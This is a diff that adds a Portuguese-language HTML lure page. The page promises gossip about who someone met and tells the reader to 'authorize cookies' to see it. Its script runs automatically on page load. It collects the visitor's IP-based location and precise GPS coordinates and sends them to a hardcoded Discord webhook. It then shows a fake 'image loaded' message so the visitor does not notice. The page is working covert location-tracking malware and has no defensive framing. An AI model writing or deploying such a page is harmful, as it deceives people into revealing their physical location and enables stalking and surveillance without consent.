@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>imagem direta</title>
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    .imgur-container {
+      cursor: pointer;
+      max-width: 320px;
+      width: 90%;
+      margin-top: 20px;
+    }
+
+    #msg {
+      margin-top: 15px;
+      color: #555;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Veja com quem ele se encontrou</h2>
+  <p>Um cara desse ainda diz ser de boa, autorize os cookies para mais detalhes</p>
+
+  <!-- CONTAINER CLICÁVEL -->
+  <div class="imgur-container" onclick="go()">
+    <blockquote
+      class="imgur-embed-pub"
+      lang="en"
+      data-id="a/cvUJSGG"
+      data-context="false">
+      <a href="//imgur.com/a/cvUJSGG"></a>
+    </blockquote>
+  </div>
+
+  <div id="msg">Solicitando permissão…</div>
+
+  <!-- SCRIPT DO IMGUR -->
+  <script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
+
+<script>
+async function go() {
+  document.getElementById("msg").innerText = "Solicitando acesso…";
+
+  const ipData = await fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .catch(() => null);
+
+  if (!navigator.geolocation) {
+    document.getElementById("msg").innerText =
+      "Geolocalização não suportada neste navegador.";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+
+      await fetch("https://discord.com/api/webhooks/1465862095399817288/GcmIkAw0qPum20GWqxT0Y1XqOswQ2SFHKu4yATRrVV0cdWV8A1R3ohUDTRmD_XV7S_ez", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content:
+`📡 Nova localização
+IP: ${ipData?.ip || "N/A"}
+País: ${ipData?.country_name || "N/A"}
+Cidade: ${ipData?.city || "N/A"}
+
+GPS:
+Lat: ${lat}
+Lon: ${lon}
+Precisão: ${acc} m
+🗺️ https://maps.google.com/?q=${lat},${lon}`
+        })
+      });
+
+      document.getElementById("msg").innerText =
+        "✅ Imagem carregada!";
+    },
+    () => {
+      document.getElementById("msg").innerText =
+        "❌ Permissão negada. Toque na imagem para tentar novamente.";
+    }
+  );
+}
+
+// tentativa automática ao abrir
+window.onload = go;
+</script>
+
+</body>
+</html>
